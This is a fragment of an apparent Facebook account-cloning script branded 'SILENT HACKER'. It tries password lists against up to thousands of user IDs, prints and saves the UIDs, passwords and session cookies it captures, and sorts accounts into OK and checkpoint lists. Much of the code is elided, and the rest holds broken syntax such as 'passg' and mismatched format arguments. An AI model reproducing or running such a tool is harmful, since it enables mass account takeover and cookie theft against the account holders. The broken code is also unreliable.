...
\t\x1b[1;97m##     ## ##     ## ##    ##  ##   ##  
\t\x1b[1;92m##     ## ##     ## ##     ## ##    ## SILENT HACKER 
\x1b[1;97m------------------------\x1b[38;5;208m------------------------
\033[1;31m\033[1;37m AUTHOR  \x1b[38;5;208m :  \033[1;32m   SILENT TECH 
\033[1;31m\033[1;37m FACEBOOK \x1b[38;5;208m:  \033[1;32m   SILENT CORNEL
\033[1;31m\033[1;37m GROUP   \x1b[38;5;208m :  \033[1;32m   RELATIONSHIP GOALS 
\033[1;31m\033[1;37m VERSION \x1b[38;5;208m :  \033[1;32m   6.0.0\x1b[1;94m + Updated
\033[1;37m------------------------\033[1;37m------------------------ """
os.system('clear')
def chk():
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[38;5;208mmMARK-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[38;5;208mMARK-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[38;5;208mMARK-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[38;5;208mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
...
def Tabii():
    ...
    print(f"")
    limit = int(input(' \033[0;97mEXAMPLE:\033[38;5;208m 1000, 2000, 5000, 10000\n\n \033[0;97mPUT CLONING LIMIT: \033[0;96m'))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                os.system("play-audio dapet.mp3")
                print('     \033[38;5;208m[SILENT-OK] '+uid+' | '+ps+
'\n\033[1;37mCookies :\033[1;34m'+coki+'\033[0;97m')
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print('     \033[38;5;208m[SILENT-CP] '+uid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\x\1b[1;92m[ SILENT ] [%s] \33[1;97m[OK:- %s CP:- %s]\r'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        passg
